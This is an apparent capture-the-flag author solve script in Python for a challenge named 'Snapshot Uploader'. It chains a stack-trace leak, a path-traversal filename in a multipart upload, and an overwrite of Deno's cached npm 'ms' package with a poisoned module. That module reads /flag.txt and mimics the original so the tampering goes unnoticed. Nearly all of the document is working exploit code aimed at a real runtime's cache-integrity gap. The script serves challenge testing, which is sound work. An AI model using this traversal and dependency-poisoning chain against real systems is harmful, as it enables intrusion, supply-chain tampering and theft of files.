#!/usr/bin/env python3
"""
Author solve for "Snapshot Uploader".

Chain:
  1. Make the render worker throw, and read the npm cache path out of the stack
     trace it hands back. No guessing at package name or version.
  2. Overwrite the extracted npm dependency through the upload traversal.
     Deno does not re-verify extracted npm files - deno.lock's integrity is a
     sha512 over the *tarball*, checked only at extract time. One write, no
     lockfile patching.
  3. Ask for another render. Workers get their own module graph and resolve
     from the cache at spawn time, so the payload runs without the API process
     ever restarting.
  4. Read the flag back out of the results directory.

Stdlib only.
"""

import argparse
import json
import re
import sys
import urllib.error
import urllib.request
import uuid

TIMEOUT = 15


def post_json(base, path, payload):
    req = urllib.request.Request(
        base + path,
        data=json.dumps(payload).encode(),
        headers={"content-type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        # The app returns 500 with a body for failed renders; that body is the point.
        return json.loads(e.read())


def get(base, path):
    try:
        with urllib.request.urlopen(base + path, timeout=TIMEOUT) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def upload(base, filename, content: bytes):
    """multipart/form-data POST with a fully attacker-controlled filename."""
    boundary = "----" + uuid.uuid4().hex
    body = b"".join([
        f"--{boundary}\r\n".encode(),
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'.encode(),
        b"Content-Type: application/octet-stream\r\n\r\n",
        content,
        f"\r\n--{boundary}--\r\n".encode(),
    ])
    req = urllib.request.Request(
        base + "/upload",
        data=body,
        headers={"content-type": f"multipart/form-data; boundary={boundary}"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())


PAYLOAD = """\
// Poisoned replacement for the npm dependency.
try {
  const flag = globalThis.Deno.readTextFileSync("/flag.txt");
  globalThis.Deno.writeTextFileSync("/app/results/%(drop)s", flag);
} catch (e) {
  try {
    globalThis.Deno.writeTextFileSync("/app/results/%(drop)s", "ERR: " + e);
  } catch (_) { /* nothing left to try */ }
}

// Keep behaving like ms() so the render still reports success and nothing looks wrong.
module.exports = function (val, opts) {
  if (typeof val === "string") return 30000;
  return (opts && opts.long) ? "30 seconds" : "30s";
};
"""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target", nargs="?", default="http://localhost:8000",
                    help="base URL (default: http://localhost:8000)")
    args = ap.parse_args()
    base = args.target.rstrip("/")
    drop = "pwned.txt"

    print(f"[*] target {base}")

    # --- 1. leak the cache path -------------------------------------------
    # An unparseable retention window makes the worker throw inside the npm
    # dependency, and the stack trace carries its resolved on-disk path.
    err = post_json(base, "/jobs", {"ttl": "not-a-duration", "note": "recon"})
    stack = err.get("error", "")
    m = re.search(r"file://(/[^\s:]*?/npm/registry\.npmjs\.org/[^\s:]+\.js)", stack)
    if m:
        cache_path = m.group(1)
        print(f"[+] leaked npm cache path: {cache_path}")
    else:
        # Default (hard) configuration: the stack is redacted. A real player
        # fingerprints the runtime, maps the box with the mkdir-vs-writefile
        # error oracle, and identifies the package from its own arithmetic
        # (ttl=1y -> 31557600000ms = 365.25 days, the npm `ms` constant).
        # The author solve short-circuits that with the known layout, since the
        # point here is to regression-test the sink, not to replay recon.
        cache_path = "/deno-dir/npm/registry.npmjs.org/ms/2.1.3/index.js"
        print(f"[*] stack redacted (default hard mode); using known layout: {cache_path}")

    # --- 2. overwrite the extracted dependency ----------------------------
    # Extra ../ segments are harmless: at / they resolve to / on Linux, so this
    # works regardless of how deep the upload directory is.
    traversal = "../" * 12 + cache_path.lstrip("/")
    res = upload(base, traversal, (PAYLOAD % {"drop": drop}).encode())
    if "stored" not in res:
        print(f"[-] upload rejected: {res}")
        return 1
    print(f"[+] wrote {res['bytes']} bytes over the cached dependency")

    # --- 3. trigger a fresh worker ----------------------------------------
    job = post_json(base, "/jobs", {"ttl": "45s", "note": "trigger"})
    print(f"[+] spawned a new worker (job {job.get('id')}, status {job.get('status')})")

    # --- 4. collect --------------------------------------------------------
    status, body = get(base, f"/results/{drop}")
    if status != 200:
        print(f"[-] no payload output at /results/{drop} (HTTP {status}): {body[:200]}")
        return 1

    text = body.decode(errors="replace").strip()
    if text.startswith("ERR:"):
        print(f"[-] payload ran but failed: {text}")
        return 1

    print(f"\n[!] FLAG: {text}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
